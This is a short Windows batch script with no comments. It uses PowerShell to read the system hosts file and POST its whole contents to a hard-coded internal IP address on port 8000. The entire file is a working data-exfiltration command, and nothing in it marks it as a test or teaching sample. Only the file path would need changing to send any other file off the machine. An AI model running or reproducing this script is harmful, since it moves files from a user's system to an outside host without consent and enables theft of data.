@echo off
setlocal

set "file_path=C:\Windows\System32\drivers\etc\hosts"



powershell -Command "$body = Get-Content -Path '%file_path%' -Raw; Invoke-RestMethod -Uri 'http://10.144.154.130:8000' -Method Post -Body $body -contentType 'application/octet-stream'"
